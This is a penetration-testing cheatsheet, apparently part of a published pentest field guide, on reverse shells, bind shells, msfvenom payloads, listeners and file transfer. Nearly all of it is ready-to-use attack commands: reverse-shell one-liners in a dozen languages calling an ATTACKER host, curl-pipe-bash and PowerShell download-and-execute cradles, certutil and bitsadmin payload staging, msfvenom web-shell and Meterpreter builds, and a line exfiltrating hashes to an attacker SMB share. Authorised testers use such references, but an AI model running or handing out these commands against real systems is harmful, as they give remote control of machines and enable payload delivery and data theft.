---
tags:
  - hack-notes
  - shells
---

# Reverse Shells and File Transfer Cheatsheet

## Table of Contents

- [Reverse Shell One-Liners](#reverse-shell-one-liners)
- [Bind Shells](#bind-shells)
- [msfvenom Payload Matrix](#msfvenom-payload-matrix)
- [Listeners](#listeners)
- [Full TTY Upgrade](#full-tty-upgrade)
- [File Transfer to Linux](#file-transfer-to-linux)
- [File Transfer to Windows](#file-transfer-to-windows)
- [SMB and FTP Transfers](#smb-and-ftp-transfers)
- [In Band and Offline Transfers](#in-band-and-offline-transfers)
- [Common Workflows](#common-workflows)
- [Quick Reference](#quick-reference)

---

## Reverse Shell One-Liners

> Replace `ATTACKER` and `443` with your listener IP and port. Start the
> listener first. See https://www.revshells.com for a generator that builds
> these and handles URL encoding for web exploitation.

### Bash

bash

```bash
bash -i >& /dev/tcp/ATTACKER/443 0>&1          # Bash interactive over /dev/tcp
bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'   # Wrapped for command injection
0<&196;exec 196<>/dev/tcp/ATTACKER/443; sh <&196 >&196 2>&196   # No /dev/tcp redirection variant
```

### Netcat and Ncat

bash

```bash
nc ATTACKER 443 -e /bin/bash                   # Classic nc with -e
ncat ATTACKER 443 -e /bin/bash                 # Ncat with command execution
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER 443 > /tmp/f   # nc without -e, named pipe
ncat --ssl ATTACKER 443 -e /bin/bash           # Encrypted Ncat shell
```

### Python

bash

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'   # Python3 reverse shell
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'   # Python2 with pty
```

### PHP

bash

```bash
php -r '$sock=fsockopen("ATTACKER",443);exec("/bin/sh -i <&3 >&3 2>&3");'   # PHP fsockopen exec
php -r '$sock=fsockopen("ATTACKER",443);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'   # PHP proc_open
```

### Perl

bash

```bash
perl -e 'use Socket;$i="ATTACKER";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'   # Perl reverse shell
```

### Ruby

bash

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'   # Ruby reverse shell
```

### PowerShell

bash

```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"   # PowerShell TCP reverse shell
```

### socat

bash

```bash
socat TCP:ATTACKER:443 EXEC:/bin/bash               # Plain socat reverse shell
socat TCP:ATTACKER:443 EXEC:'bash -li',pty,stderr,setsid,sigint,sane   # Fully interactive PTY shell
# On the attacker, catch with:
socat -d -d TCP-LISTEN:443 STDOUT                   # socat listener for the PTY shell
```

### awk and lua

bash

```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null   # awk reverse shell
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER',443);os.execute('/bin/sh -i <&3 >&3 2>&3');"   # lua reverse shell
```

---

## Bind Shells

bash

```bash
nc -lvnp 4444 -e /bin/bash                     # Linux nc bind shell, victim listens
ncat -lvnp 4444 -e cmd.exe                      # Windows ncat bind shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l 4444 >/tmp/f   # nc bind without -e
python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",4444));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'   # Python bind shell
# Connect from the attacker:
nc TARGET 4444                                  # Attach to the bind shell
```

---

## msfvenom Payload Matrix

bash

```bash
msfvenom --list payloads                        # List all available payloads
msfvenom --list formats                         # List output formats
```

### Linux

bash

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f elf -o shell.elf   # Stageless ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f elf -o met.elf   # Staged meterpreter
```

### Windows

bash

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o shell.exe   # Stageless x64 exe
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o shell32.exe   # Stageless x86 exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o met.exe   # Staged meterpreter
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o met_stageless.exe   # Stageless meterpreter
```

### Web Payloads (php, asp, jsp, war)

bash

```bash
msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=443 -f raw -o shell.php   # PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f raw -o met.php   # PHP meterpreter
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f asp -o shell.asp   # Classic ASP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f raw -o shell.jsp   # JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f war -o shell.war   # Deployable WAR
```

> Staged payloads (single `/`, like `meterpreter/reverse_tcp`) need a
> Metasploit handler. Stageless payloads (`_` like `shell_reverse_tcp`) work
> against a plain netcat listener.

---

## Listeners

bash

```bash
nc -lvnp 443                                    # Netcat listener, listen verbose no DNS port
ncat -lvnp 443                                  # Ncat listener
ncat --ssl -lvnp 443                            # Encrypted Ncat listener
rlwrap nc -lvnp 443                             # Wrap nc for arrow keys and history
```

### pwncat

bash

```bash
pwncat-cs -lp 443                               # pwncat listener with auto TTY handling
pwncat-cs ATTACKER 443                          # pwncat connect to a bind shell
```

### Metasploit multi/handler

bash

```bash
msfconsole -q                                   # Start console quietly
use exploit/multi/handler                       # Generic payload handler
set payload windows/x64/meterpreter/reverse_tcp # Match the generated payload exactly
set LHOST ATTACKER                              # Your listening interface
set LPORT 443                                   # Listening port
set ExitOnSession false                         # Keep handler up for multiple shells
exploit -j                                      # Run as a background job
```

---

## Full TTY Upgrade

bash

```bash
# Step 1: spawn a PTY inside the dumb shell
python3 -c 'import pty; pty.spawn("/bin/bash")'   # Python PTY spawn
# or, if python is missing:
script -qc /bin/bash /dev/null                    # script command PTY
```

### Make It Fully Interactive

bash

```bash
# Step 2: background the shell
# Press Ctrl-Z

# Step 3: on the local attacker terminal
stty raw -echo; fg                              # Pass raw keys through, foreground the shell

# Step 4: back in the reverse shell, fix the environment
export TERM=xterm                               # Enable clear, less, vim, top
export SHELL=/bin/bash                          # Set a proper shell variable
stty rows 38 columns 116                        # Match your terminal size (from stty -a locally)
```

> Run `stty -a` in a local terminal first to read off the real rows and
> columns. A correct size stops vim and less from wrapping badly.

---

## File Transfer to Linux

bash

```bash
# On the attacker, serve the directory:
python3 -m http.server 80                        # Quick HTTP server
updog -p 80                                       # updog, supports upload too
# On the target, pull the file:
wget http://ATTACKER/tool -O /tmp/tool            # Download with wget
curl http://ATTACKER/tool -o /tmp/tool            # Download with curl
curl http://ATTACKER/tool | bash                  # Fetch and run in memory
```

### scp and Netcat

bash

```bash
scp tool user@TARGET:/tmp/tool                    # Push over SSH
scp user@TARGET:/etc/passwd ./loot               # Pull from the target
# Netcat transfer, receiver first:
nc -lvnp 4444 > tool                              # Target listens and writes file
nc TARGET 4444 < tool                             # Attacker sends the file
```

### /dev/tcp Download

bash

```bash
exec 3<>/dev/tcp/ATTACKER/80                       # Open a socket on fd 3
echo -e "GET /tool HTTP/1.0\r\n\r\n" >&3           # Send a raw HTTP request
cat <&3 > /tmp/tool                                # Read the response into a file
```

---

## File Transfer to Windows

bash

```bash
certutil -urlcache -split -f http://ATTACKER/tool.exe C:\Windows\Temp\tool.exe   # certutil download
certutil -urlcache -f http://ATTACKER/tool.exe tool.exe   # Shorter certutil form
bitsadmin /transfer job /download /priority normal http://ATTACKER/tool.exe C:\Windows\Temp\tool.exe   # BITS transfer
```

### PowerShell Downloads

bash

```bash
powershell -c "Invoke-WebRequest -Uri http://ATTACKER/tool.exe -OutFile C:\Windows\Temp\tool.exe"   # IWR download
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER/tool.exe','C:\Windows\Temp\tool.exe')"   # WebClient download
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')"   # Fetch and run in memory
powershell -c "IWR http://ATTACKER/tool.exe -OutFile tool.exe"   # IWR alias form
```

---

## SMB and FTP Transfers

bash

```bash
# On the attacker, host an SMB share:
impacket-smbserver share $(pwd) -smb2support             # Share current dir, SMBv2
impacket-smbserver share $(pwd) -smb2support -user u -password p   # With authentication
# On the Windows target:
copy \\ATTACKER\share\tool.exe C:\Windows\Temp\tool.exe  # Copy from the share
copy C:\loot\hash.txt \\ATTACKER\share\hash.txt          # Exfiltrate to the share
net use \\ATTACKER\share /user:u p                        # Authenticate first if required
```

### FTP

bash

```bash
# On the attacker, run an FTP server:
python3 -m pyftpdlib -p 21 -w                            # Writable anonymous FTP
# On the target, script an FTP session:
echo open ATTACKER 21 > ftp.txt                          # Build a command file
echo anonymous>> ftp.txt                                 # Username
echo pass>> ftp.txt                                      # Password
echo binary>> ftp.txt                                    # Binary mode for executables
echo get tool.exe>> ftp.txt                              # Fetch the file
echo bye>> ftp.txt                                       # Close session
ftp -s:ftp.txt                                           # Run the scripted FTP transfer
```

---

## In Band and Offline Transfers

### base64 Copy and Paste

bash

```bash
# On the attacker, encode the file:
base64 -w0 tool < tool                                   # Single line base64
# Paste into the shell on the target, then decode:
echo "BASE64STRING" | base64 -d > /tmp/tool              # Decode on Linux
# On Windows PowerShell:
[IO.File]::WriteAllBytes("C:\tool.exe",[Convert]::FromBase64String("BASE64STRING"))   # Decode on Windows
```

### xxd Hex Transfer

bash

```bash
xxd -p tool | tr -d '\n' > tool.hex                      # Encode to hex on the attacker
# Paste the hex into the shell, then:
xxd -r -p tool.hex > /tmp/tool                           # Reassemble on the target
```

### nc Transfer Recap

bash

```bash
nc -lvnp 4444 > received_file                            # Receiver listens
nc -q0 ATTACKER 4444 < file_to_send                      # Sender, close after EOF
```

---

## Common Workflows

### Workflow: Gain Exec, Catch, Upgrade, Tool Up

bash

```bash
# Step 1: start the listener before triggering the payload
rlwrap nc -lvnp 443                              # Catch the shell with history support

# Step 2: trigger a reverse shell on the target
# (web shell, command injection, scheduled task, etc.)
bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'  # Example trigger

# Step 3: upgrade to a full TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'  # PTY
# Ctrl-Z
stty raw -echo; fg                               # Raw mode
export TERM=xterm                                # Fix terminal

# Step 4: transfer enumeration tooling
python3 -m http.server 80                        # Serve on attacker
wget http://ATTACKER/linpeas.sh -O /tmp/lp.sh    # Pull on target
chmod +x /tmp/lp.sh && /tmp/lp.sh                # Run it
```

### Workflow: Windows Foothold

bash

```bash
ncat -lvnp 443                                   # Listener
# Trigger the PowerShell reverse shell one-liner on the target
certutil -urlcache -split -f http://ATTACKER/winPEASx64.exe C:\Windows\Temp\wp.exe   # Stage winPEAS
C:\Windows\Temp\wp.exe quiet                     # Enumerate
```

### Workflow: Staged Meterpreter

bash

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o met.exe   # Build
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER; set LPORT 443; run"   # Handler
# Deliver and execute met.exe on the target
```

---

## Quick Reference

bash

```bash
bash -i >& /dev/tcp/ATTACKER/443 0>&1            # Bash reverse shell
nc -lvnp 443                                     # Netcat listener
rlwrap nc -lvnp 443                              # Listener with history
python3 -c 'import pty; pty.spawn("/bin/bash")'  # Spawn PTY
stty raw -echo; fg                               # Finish TTY upgrade
export TERM=xterm                                # Fix terminal type
msfvenom -p PAYLOAD LHOST=ATTACKER LPORT=443 -f FMT -o out   # Build payload
python3 -m http.server 80                        # Serve files
wget http://ATTACKER/f -O /tmp/f                 # Pull on Linux
certutil -urlcache -split -f http://ATTACKER/f.exe f.exe   # Pull on Windows
impacket-smbserver share $(pwd) -smb2support     # Host SMB share
nc -lvnp 4444 > file; nc TARGET 4444 < file      # Netcat file transfer
echo "B64" | base64 -d > /tmp/f                  # Offline base64 drop
```

### Reference Sites

bash

```bash
# https://www.revshells.com                    Reverse shell generator
# https://gtfobins.github.io                    Binary file read and write
# https://lolbas-project.github.io              Windows download cradles
# https://github.com/calebstewart/pwncat        pwncat post exploitation
# https://book.hacktricks.xyz                   Shells and transfers
```

---

## Related

- Checklists: [Red Team Operation](../Checklists/Red%20Team%20Operation.md), [External Network Penetration Test](../Checklists/External%20Network%20Penetration%20Test.md)
- [Linux Privilege Escalation](Linux%20Privilege%20Escalation.md)
- [Windows Privilege Escalation](Windows%20Privilege%20Escalation.md)
- [Pivoting and Tunneling](Pivoting%20and%20Tunneling.md)
- [Web App and Payloads](Web%20App%20and%20Payloads.md)

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
